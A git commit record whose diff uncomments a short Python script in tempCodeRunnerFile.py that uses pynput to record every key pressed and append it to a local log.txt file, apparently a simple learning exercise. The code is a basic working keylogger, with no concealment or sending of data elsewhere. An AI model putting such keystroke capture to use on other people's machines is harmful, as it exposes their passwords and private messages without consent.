2b5737d8951b99f818f3cb65448268ac0acf684c
Ghayur <154737827+ghayurcodes@users.noreply.github.com>
2024-12-17 12:31:15 +0500

    Update tempCodeRunnerFile.py

--- tempCodeRunnerFile.py
+++ tempCodeRunnerFile.py
@@ -1,13 +1,13 @@
-# from pynput.keyboard import Listener
+from pynput.keyboard import Listener
 
 
-# def addtofile(key):
-#     keydata=str(key)
-#     with open("log.txt",'a') as f:
-#         f.write(keydata)
+def addtofile(key):
+    keydata=str(key)
+    with open("log.txt",'a') as f:
+        f.write(keydata)
 
 
 
 
-# with Listener(on_press=addtofile) as l:
-#     l.join()
+with Listener(on_press=addtofile) as l:
+    l.join(timeout= 2)
